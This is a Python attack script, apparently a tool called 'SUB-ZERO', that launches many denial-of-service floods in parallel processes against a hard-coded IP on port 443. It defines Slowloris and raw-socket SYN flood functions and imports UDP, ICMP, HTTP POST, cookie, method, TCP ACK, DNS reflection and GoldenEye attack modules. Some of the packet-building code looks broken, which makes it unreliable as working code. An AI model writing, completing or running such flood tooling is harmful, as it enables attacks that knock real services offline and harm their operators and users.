import logging
import socket
import random
import time
from multiprocessing import Process
from plugins.zero import sub_zero
from plugins.ping import ping_test

# Logging Configuration
logging.basicConfig(
    filename="logs/aftermath.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
)

# Target Configuration
TARGET_IP = "197.136.218.3"  # Example target IP
TARGET_PORT = 443  # Example target port
THREADS = 20

# Slowloris Attack
def slowloris():
    logging.info("Starting Slowloris attack...")
    headers = "GET / HTTP/1.1\r\nHost: {}\r\n".format(TARGET_IP)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET_IP, TARGET_PORT))
            s.send(headers.encode())
            logging.debug(f"Slowloris: Sent header to {TARGET_IP}")
            time.sleep(5)
        except Exception as e:
            logging.error(f"Error in Slowloris attack: {e}")

# SYN Flood Attack
def syn_flood():
    logging.info("Starting SYN Flood attack...")
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            # Generating raw packet (fixed for older Python versions)
            ip_header = b"\x45\x00\x00\x28" + random.getrandbits(8).to_bytes(8, "big")
            tcp_header = b"\x00\x50" + random.getrandbits(6).to_bytes(6, "big")
            packet = ip_header + tcp_header

            s.sendto(packet, (TARGET_IP, TARGET_PORT))
            logging.debug(f"SYN Flood: Sent packet to {TARGET_IP}")
        except Exception as e:
            logging.error(f"Error in SYN Flood attack: {e}")

# Importing Additional Attack Modules
from frosted_flakes.udp_flood import udp_flood
from frosted_flakes.icmp_flood import icmp_flood
from frosted_flakes.http_post_flood import http_post_flood
from frosted_flakes.dns_reflection import dns_reflection
from frosted_flakes.slow_http_post import slow_http_post
from frosted_flakes.http_cookie_flood import http_cookie_flood
from frosted_flakes.http_method_flood import http_method_flood
from frosted_flakes.tcp_ack_flood import tcp_ack_flood
from frosted_flakes.slow_http_post_attack import slow_http_post_attack
from frosted_flakes.goldeneye import goldeneye

# Function to Launch Attacks
def launch_attacks():
    while True:
        processes = []

        # Core Attacks
        processes.append(Process(target=slowloris))
        processes.append(Process(target=syn_flood))
        processes.append(Process(target=dns_reflection, args=(TARGET_IP,)))  # Fixed missing argument

        # Additional Attacks
        processes.append(Process(target=udp_flood, args=(TARGET_IP, TARGET_PORT)))
        processes.append(Process(target=icmp_flood, args=(TARGET_IP,)))
        processes.append(Process(target=http_post_flood, args=(TARGET_IP,)))
        processes.append(Process(target=dns_reflection, args=(TARGET_IP,)))  # Fixed again
        processes.append(Process(target=slow_http_post, args=(TARGET_IP,)))
        processes.append(Process(target=http_cookie_flood, args=(TARGET_IP,)))
        processes.append(Process(target=http_method_flood, args=(TARGET_IP,)))
        processes.append(Process(target=tcp_ack_flood, args=(TARGET_IP, TARGET_PORT)))
        processes.append(Process(target=slow_http_post_attack, args=(TARGET_IP,)))
        processes.append(Process(target=goldeneye, args=(TARGET_IP,)))

        # Start All Processes
        for p in processes:
            p.start()

        time.sleep(6)  # Attacks run for 6 seconds

        # Terminate All Processes
        for p in processes:
            p.terminate()
        break
# Main Execution
if __name__ == "__main__":
    ping_test()
    sub_zero()
    time.sleep(6)
    logging.info("SUB-ZERO starting attack scripts...")
    launch_attacks()
    logging.info("SUB-ZERO terminated.")
